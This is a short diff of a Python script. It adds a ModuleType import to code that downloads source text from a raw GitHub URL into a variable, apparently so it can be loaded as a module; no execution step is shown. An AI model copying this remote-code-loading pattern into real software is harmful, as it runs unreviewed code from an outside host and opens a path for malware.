@@ -1,4 +1,5 @@
 from urllib.request import urlopen
+from types import ModuleType
 
 with urlopen('https://raw.githubusercontent.com/uniuxify/num/main/4.txt') as resp:
   src = (resp.read().decode())
